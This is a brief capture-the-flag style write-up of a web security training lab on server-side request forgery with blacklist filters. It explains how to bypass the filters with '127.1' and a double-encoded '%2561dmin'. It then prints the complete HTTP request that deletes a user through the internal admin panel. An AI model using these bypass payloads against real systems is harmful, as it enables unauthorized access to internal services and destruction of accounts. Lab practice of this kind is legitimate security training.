# SSRF with blacklist-based input filters

So for this lab, there are 2 challenges whihc blacklists some SSRF vuln props.  
> The first one is it blocks direct loopback connection requests to `127.0.0.1`, to bypass that, we need to pass it as smth that gives the similar value in `base256`, I used `127.1`.
> The second one is obsfucating `admin` as it detects the word and blacklists it, I encoded `a` in URL-encode and passed it as `%2561`.

## SCRIPT to delete the user!
```
POST /product/stock HTTP/2
Host: 0ac600fc04aefb8f80e86c50002600e5.web-security-academy.net
Cookie: session=Fi1DbW424VALbNC4hRFQK3zTzufiiuvL; session=8V70OuqVuLwqtiTVLmpDgkvMbv242NvB
Content-Length: 54
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: https://0ac600fc04aefb8f80e86c50002600e5.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac600fc04aefb8f80e86c50002600e5.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://127.1/%2561dmin/delete?username=carlos
```

> LAB SOLVED!!!
